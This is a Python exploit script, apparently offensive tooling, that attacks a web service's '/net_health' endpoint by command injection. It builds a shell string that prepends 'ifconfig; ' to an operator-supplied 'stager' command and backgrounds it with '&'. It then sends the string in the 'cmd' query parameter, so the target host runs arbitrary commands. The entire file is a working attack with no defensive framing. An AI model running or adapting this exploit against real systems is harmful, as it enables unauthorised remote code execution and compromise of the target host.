import requests
import argparse

###

def get_net_health(ip_address, port, cmd):
    # Construct the URL
    url = f"http://{ip_address}:{port}/net_health"
    
    # Prepare the payload (URL-encoded data)
    print("[*] cmd: " + str(cmd))
    payload = {'cmd': cmd}
    
    # Perform the GET request with URL-encoded data
    response = requests.get(url, params=payload)
    
    # Check the status and print the response
    if response.status_code == 200:
        print(f"Response:\n{response.text}")
    else:
        print(f"Failed to get data. Status code: {response.status_code}")

###

def main():
    # Initialize argument parser
    parser = argparse.ArgumentParser(description="Perform a GET request to check network health.")
    
    # Add arguments
    parser.add_argument("ip_address", type=str, help="IP address of the target")
    parser.add_argument("port", type=int, help="Port number", default=5001)

    # Parse arguments
    args = parser.parse_args()

    # Take user input
    user_input = input("Voodoo Stager (Python 3): ")

    e_string = user_input + " &"
    e_string = "ifconfig; " + e_string

    # Display the result
    print("\n")
    print(f"cmd=: {e_string}")
    print("\n")

    input("Press Enter to Throw the E...")
    
    # Call the function with parsed arguments
    get_net_health(args.ip_address, args.port, e_string)


if __name__ == "__main__":
    main()